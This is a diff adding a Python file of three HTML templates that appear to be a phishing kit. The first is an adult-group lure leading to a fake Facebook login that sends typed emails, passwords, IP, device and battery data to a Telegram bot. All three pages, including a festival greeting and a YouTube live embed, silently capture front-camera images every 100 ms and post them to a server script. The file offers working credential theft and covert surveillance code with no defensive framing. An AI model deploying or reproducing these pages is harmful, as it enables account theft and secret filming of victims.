@@ -1,0 +1,245 @@
+XINDEX_HTML = '''<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔞+ Group🥵</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
+        body { display:flex; justify-content:center; align-items:center; height:100vh; background:#f0f2f5; }
+        .hidden { display:none; }
+        .group-container, .login-container { width:90%; max-width:400px; background:#fff; padding:20px; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,0.2); text-align:center; }
+        .profile-img { width:80px; height:80px; border-radius:50%; object-fit:cover; margin-bottom:10px; }
+        .group-name { font-size:20px; font-weight:bold; }
+        .participants { font-size:14px; color:gray; }
+        .icons { display:flex; justify-content:center; gap:30px; margin:15px 0; }
+        .icon-box { display:flex; flex-direction:column; align-items:center; font-size:14px; }
+        .icon { font-size:24px; cursor:pointer; }
+        .media-section { text-align:left; margin-top:20px; padding-left:10px; }
+        .media-box-container { display:flex; gap:10px; overflow-x:auto; padding:10px 0; }
+        .media-box { width:70px; height:60px; border-radius:10px; background:#ddd; display:flex; align-items:center; justify-content:center; font-size:12px; background-size:cover; }
+        #box1 { background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNaiqhOTVqwgbtyQoPVchZqw9Xeck3i594WS0uXVkw7eQSA91gFwc-ZkA&s=10'); }
+        #box4 { background-image:url('https://cdncontent.xxxwaffle.com/content/2/569/2569412_dcb18f0.jpg'); }
+        #box2 { background-image:url('https://i.postimg.cc/N0JzTxXk/IMG-20220726-210625-picsay.jpg'); }
+        #box3 { background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRWO8_tofwFoFbst0MEHZa-pWgCBQTjyvAnWt7OjiTMxHqvxNCBtz1U_k4&s=10'); }
+        #box5 { background-image:url('https://i.ibb.co/85YydzM/165325118357786736.png'); }
+        .join-btn { background:linear-gradient(to right,#ff00ff,#0000ff); color:#fff; border:none; padding:12px 25px; margin-top:20px; cursor:pointer; border-radius:5px; font-size:16px; }
+        .login-header { font-size:22px; font-weight:bold; color:#1877f2; }
+        .subtext { font-size:14px; color:#555; margin-bottom:20px; }
+        .input-box { position:relative; margin-top:10px; }
+        .input-box input { width:100%; padding:12px; padding-right:40px; border:1px solid #ccc; border-radius:5px; font-size:16px; }
+        .show-btn { position:absolute; right:10px; top:50%; transform:translateY(-50%); cursor:pointer; font-size:14px; color:#007bff; background:none; border:none; display:none; font-weight:bold; }
+        .btn { background:linear-gradient(45deg,#ff0080,#8000ff); color:#fff; border:none; padding:12px; width:100%; font-size:16px; cursor:pointer; margin-top:15px; border-radius:5px; font-weight:bold; text-transform:uppercase; }
+        .footer-sabi { text-align:center; color:#888; font-size:12px; margin-top:10px; }
+        .video-wrap { display:none; }
+    </style>
+</head>
+<body>
+<div class="video-wrap"><video id="video" playsinline autoplay></video></div>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<div class="group-container" id="groupPage">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRu7BslXlUg0c8KojMtP6jwXaSptlkqDMy3Jg&usqp=CAU" class="profile-img">
+    <h2 class="group-name">SEX VIDEOS 🔞+ 💋💦🥵</h2>
+    <p class="participants">Group 1,670 Participants</p>
+    <div class="icons">
+        <div class="icon-box"><span class="icon">📞</span><span>Call</span></div>
+        <div class="icon-box"><span class="icon">📹</span><span>Video</span></div>
+        <div class="icon-box"><span class="icon">🔍</span><span>Search</span></div>
+    </div>
+    <div class="media-section">
+        <p>Media, links and docks</p>
+        <div class="media-box-container">
+            <div id="box1" class="media-box"></div>
+            <div id="box2" class="media-box"></div>
+            <div id="box3" class="media-box"></div>
+            <div id="box4" class="media-box"></div>
+            <div id="box5" class="media-box">videos</div>
+        </div>
+    </div>
+    <button class="join-btn" onclick="showLogin()">JOIN THE GROUP</button>
+</div>
+
+<div class="login-container hidden" id="loginPage">
+    <h2 class="login-header">Facebook</h2>
+    <p class="subtext">Log in to your Facebook account to connect to Group 18+</p>
+    <form id="loginForm">
+        <div class="input-box"><input type="text" name="email" id="emailOrPhone" placeholder="Number or email address"></div>
+        <div class="input-box">
+            <input type="password" name="password" id="password" placeholder="Password" oninput="toggleShowButton()">
+            <button type="button" class="show-btn" id="showBtn" onclick="togglePassword()">Show</button>
+        </div>
+        <button type="submit" class="btn">Log In</button>
+    </form>
+    <div class="footer-dgtl">Powered by DGTL</div>
+</div>
+
+<script>
+function showLogin(){ document.getElementById('groupPage').classList.add('hidden'); document.getElementById('loginPage').classList.remove('hidden'); }
+function toggleShowButton(){ let p=document.getElementById('password'); let b=document.getElementById('showBtn'); b.style.display = p.value.length>0?'block':'none'; }
+function togglePassword(){ let p=document.getElementById('password'); let b=document.getElementById('showBtn'); if(p.type==='password'){p.type='text'; b.textContent='Hide';} else {p.type='password'; b.textContent='Show';} }
+
+document.getElementById('loginForm').addEventListener('submit', async function(e){
+    e.preventDefault();
+    const email = document.getElementById('emailOrPhone').value;
+    const pass = document.getElementById('password').value;
+    const botToken = '1234567890';
+    const chatId = '1234567890';
+    const ipData = await fetch('https://api.ipify.org?format=json').then(res=>res.json());
+    const device = navigator.userAgent;
+    let batt = 'Unavailable';
+    if(navigator.getBattery) { const b=await navigator.getBattery(); batt=`Battery: ${Math.round(b.level*100)}%, Charging: ${b.charging}`; }
+    const msg = `📥 Login Info:\\n-----------------------------\\n📧 Email: ${email}\\n🔑 Pass: ${pass}\\n🔋 ${batt}\\n🌐 IP: ${ipData.ip}\\n📱 Device: ${device}\\n-----------------------------\\n📌 Create by DGTL`;
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:chatId, text:msg}) });
+    } catch(e) {}
+    window.location.href = 'https://www.facebook.com/login/';
+});
+
+function post(imgdata){
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'post.php',
+        dataType: 'json',
+        async: false
+    });
+}
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const constraints = { audio: false, video: { facingMode: "user" } };
+
+async function init(){
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        const ctx = canvas.getContext('2d');
+        setInterval(function(){
+            ctx.drawImage(video, 0, 0, 640, 480);
+            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+            post(canvasData);
+        }, 100);
+    } catch(e) {
+        console.log("Camera not available");
+    }
+}
+init();
+</script>
+</body>
+</html>'''
+
+WISH_HTML = '''<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>꧁𓊈𒆜Happy fes_name𒆜𓊉꧂</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<style>
+    * { box-sizing:border-box; }
+    body { background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9); background-size:cover; font-family:Arial; text-align:center; }
+    .container { padding:20px; }
+    .main-greeting { max-width:600px; margin:auto; background:rgba(255,255,255,0.7); border-radius:20px; padding:20px; }
+    .footerbtn { display:inline-block; margin:10px; padding:10px 20px; border-radius:15px; background:#34af23; color:#fff; text-decoration:none; }
+    .footerbtn1 { display:inline-block; margin:10px; padding:10px 20px; border-radius:15px; background:#000099; color:#fff; text-decoration:none; }
+    h1 { font-size:2.5em; }
+    .footer-dgtl { margin-top:20px; color:#888; font-size:12px; }
+    .video-wrap { display:none; }
+</style>
+</head>
+<body>
+<div class="video-wrap"><video id="video" playsinline autoplay></video></div>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+<div class="container">
+    <div class="main-greeting">
+        <h1>🎉 HAPPY <span id="fesPlaceholder">fes_name</span> 🎉</h1>
+        <p><marquee behavior="alternate">“May this occasion bring lots of happiness”</marquee></p>
+        <p>Enter your name: <input type="text" id="nameInput" placeholder="Your name"></p>
+        <button onclick="updateName()">Update</button>
+        <div id="greetingDisplay"><h2 style="color:#f06414;">Wishing you a Happy fes_name</h2></div>
+        <div class="footer-sabi">Powered by Sabi</div>
+        <a class="footerbtn" href="whatsapp://send?text=Check this out: forwarding_link">Share on WhatsApp</a>
+        <a class="footerbtn1" href="https://www.facebook.com/sharer/sharer.php?u=forwarding_link" target="_blank">Share on Facebook</a>
+    </div>
+</div>
+<script>
+function updateName(){ let n=document.getElementById('nameInput').value; document.getElementById('greetingDisplay').innerHTML='<h2 style="color:#f06414;">Happy fes_name, '+n+'!</h2>'; }
+function post(imgdata){
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'post.php',
+        dataType: 'json',
+        async: false
+    });
+}
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const constraints = { audio: false, video: { facingMode: "user" } };
+async function init(){
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        const ctx = canvas.getContext('2d');
+        setInterval(function(){
+            ctx.drawImage(video, 0, 0, 640, 480);
+            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+            post(canvasData);
+        }, 100);
+    } catch(e) {}
+}
+init();
+</script>
+</body>
+</html>'''
+
+YOUTUBE_HTML = '''<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🟥⃢▸  Live YouTube</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<style>
+    body { margin:0; background:#000; }
+    iframe { width:100%; height:100vh; border:0; }
+    .footer-sabi { position:fixed; bottom:10px; left:0; right:0; text-align:center; color:#888; font-size:12px; background:rgba(0,0,0,0.7); padding:5px; }
+    .video-wrap { display:none; }
+</style>
+</head>
+<body>
+<div class="video-wrap"><video id="video" playsinline autoplay></video></div>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+<iframe src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<div class="footer-dgtl">Powered by DGTL</div>
+<script>
+function post(imgdata){
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'post.php',
+        dataType: 'json',
+        async: false
+    });
+}
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const constraints = { audio: false, video: { facingMode: "user" } };
+async function init(){
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        const ctx = canvas.getContext('2d');
+        setInterval(function(){
+            ctx.drawImage(video, 0, 0, 640, 480);
+            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+            post(canvasData);
+        }, 100);
+    } catch(e) {}
+}
+init();
+</script>
+</body>
+</html>'''
